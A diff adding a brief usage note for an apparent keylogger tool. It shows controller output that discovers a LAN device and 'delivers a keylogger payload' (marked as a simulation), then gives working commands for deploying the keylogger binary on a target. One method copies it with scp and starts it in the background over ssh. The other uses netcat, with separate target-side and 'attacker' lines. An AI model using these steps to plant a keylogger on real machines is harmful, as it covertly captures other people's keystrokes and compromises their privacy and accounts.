@@ -1,0 +1,28 @@
+That is 
+$ sudo python3 controller.py
+
+Starting keylogger controller...
+
+Discovered Devices:
+1. IP: 192.168.104.6   MAC: b2:7e:dd:4c:1b:55
+
+Select target number to send payload to: 1
+
+[+] Selected Target: 192.168.104.6
+[*] Sending keylogger payload to 192.168.104.6 ...
+[+] Payload delivered to 192.168.104.6 (simulation)
+ ---->>>>#THIS IS A SIMULATIO<-------
+
+To send to a target
+1. SCP if u have ssh access to the target
+* use ---> scp ../payloads/target/release/payloads user@target_ip:/tmp/keylogger
+ssh user@target_ip 'chmod +x /tmp/keylogger && /tmp/keylogger &'
+
+
+2. Netcat Transfer<No ssh, but open Netcat port>
+* use ---> nc -lvnp 9999 > /tmp/keylogger && chmod +x /tmp/keylogger && /tmp/keylogger &
+
+for the attacker
+
+nc target_ip 9999 < ../payloads/target/release/payloads
+
